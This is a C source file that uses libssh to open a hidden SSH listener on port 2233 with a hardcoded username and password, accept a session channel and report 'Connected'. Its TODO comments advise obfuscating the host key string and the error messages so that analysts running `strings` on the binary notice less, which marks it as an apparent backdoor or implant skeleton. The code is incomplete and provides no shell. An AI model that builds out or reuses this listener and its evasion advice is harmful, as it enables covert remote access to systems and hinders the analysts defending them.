#include <libssh/libssh.h>
#include <libssh/server.h>
#include <stdio.h>
#include <string.h>

const int SUCCESS = 1;
const int FAILURE = 0;
const int ERROR = -1;

static int auth_password(const char *username, const char *password) {
    int result = FAILURE;

    if(!strcmp(username, "ssh_user") && !strcmp(password, ("somePassword"))) {
        result = SUCCESS;
    }

    return result;
}

static int auth(ssh_message message) {
    int response = FAILURE;

    if(ssh_message_subtype(message) == SSH_AUTH_METHOD_PASSWORD) {
        if(auth_password(ssh_message_auth_user(message), ssh_message_auth_password(message))) {
            response = SUCCESS;
            ssh_message_auth_reply_success(message, 0);
        }
    }

    else {
        ssh_message_auth_set_methods(message, SSH_AUTH_METHOD_PASSWORD);
        ssh_message_reply_default(message);
    }

    return response;
}

static void setOptions(ssh_bind bind) {
    ssh_bind_options_set(bind, SSH_BIND_OPTIONS_BINDPORT_STR, "2233");
    ssh_bind_options_set(bind, SSH_BIND_OPTIONS_HOSTKEY, "host_key"); // TODO: You'll be wanting to obfuscate this string to make it less obvious when an analyst runs `strings` against it
}

int main(int argc, char **argv) {
    ssh_session sesh;
    ssh_bind bind;
    ssh_message message;
    ssh_channel chan = 0;
    int authed = 0;
    int sftp = 0;

    int error_state = 0;

    bind = ssh_bind_new();
    sesh = ssh_new();

    setOptions(bind);
    
    error_state = ssh_bind_listen(bind);

    if(error_state) {
        printf("ERROR on listen\n");  // TODO: This will want to be obfuscated/removed too
        return ERROR;
    }

    error_state = ssh_bind_accept(bind, sesh);

    if(error_state == SSH_ERROR) {
        printf("ERROR on accept\n");  // TODO: This will want to be obfuscated/removed too
        return ERROR;
    }

    if(ssh_handle_key_exchange(sesh)) {
        printf("ERROR on KEx\n");  // TODO: This will want to be obfuscated/removed too
        return ERROR;
    }

    while(!authed) {
        message = ssh_message_get(sesh);

        if(!message) {
            break;
        }

        switch(ssh_message_type(message)) {
            case SSH_REQUEST_AUTH:
                authed = auth(message);
                break;
            default:
                ssh_message_reply_default(message);
        }

        ssh_message_free(message);
    }

    if(!authed) {
        printf("ERROR auth\n");
        ssh_disconnect(sesh);
        return ERROR;
    }

    do {
        message = ssh_message_get(sesh);

        if(message) {
            if(ssh_message_type(message) == SSH_REQUEST_CHANNEL_OPEN && ssh_message_subtype(message) == SSH_CHANNEL_SESSION) {
                chan = ssh_message_channel_request_open_reply_accept(message);
                break;
            } 
            
            else {
                ssh_message_reply_default(message);
            }
        }        

        ssh_message_free(message);
    } while(message && !chan);

    if(!chan) {
        printf("ERROR sesh\n");
        ssh_finalize();
        return ERROR;
    }

    do {
        message = ssh_message_get(sesh);

        if(message) {
            if(ssh_message_type(message) == SSH_REQUEST_CHANNEL) {
                sftp = SUCCESS;
                ssh_message_channel_request_reply_success(message);
                break;
            }
        }

        if(!sftp) {
            ssh_message_reply_default(message);
        }

        ssh_message_free(message);
    } while(message && !sftp);

    printf("Connected\n");

    ssh_disconnect(sesh);
    ssh_bind_free(bind);

    ssh_finalize();

    return 0;
}